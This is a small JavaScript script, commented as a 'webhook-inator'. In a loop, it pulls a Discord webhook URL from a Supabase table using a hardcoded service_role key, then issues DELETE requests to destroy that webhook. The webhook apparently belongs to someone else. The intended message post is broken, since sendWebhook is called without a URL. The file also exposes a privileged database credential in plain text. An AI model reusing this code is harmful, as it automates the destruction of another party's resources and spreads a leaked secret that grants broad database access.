//Трепещи xTroll утканос, я изобрёл вебхук-инатор!

const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
const chillout = "https://kappjyhgnyeetqhzwcpn.supabase.co/rest/v1/system_config?id=eq.discord_webhook&select=value";
const chillout2 = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImthcHBqeWhnbnllZXRxaHp3Y3BuIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc2OTg0NDY4MiwiZXhwIjoyMDg1NDIwNjgyfQ.-XWR3RDlGstIrF-SC3VMaqcYXA7EgIZ-I9FyDO9bWDQ";

const data = {
  content: 'ntcn'
};

async function sendWebhook(webhook_) {
    try {
        const response = await fetch(webhook_, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data),
        });

        if (response.ok === false) {
            console.log(response.statusText);
        }
    } catch (err) {
        console.log(err);
    }
}

async function getLiveEndpoint() {
    const headers = {
        "apikey": chillout2,
        "Authorization": "Bearer " + chillout2
    };

    try {
        const response = await fetch(chillout, { headers });
        if (!response.ok) return null;

        const data = await response.json();
        if (data && data[0] && data[0].value) {
            return data[0].value;
        }
    } catch (err) {
        console.log(err)
    }

    return null;
}

async function deleteWebhook(webhook_) {
  try {
    const response = await fetch(webhook_, { method: "DELETE" });
    console.log(response)
  }  catch (err) {console.log(err)}
}


async function main() {
    while (true) {
        await delay(15000);
        let webhook = await getLiveEndpoint();
        console.log(webhook);
        sendWebhook();
        await delay(5000);
        deleteWebhook(webhook);
    }
}

main()
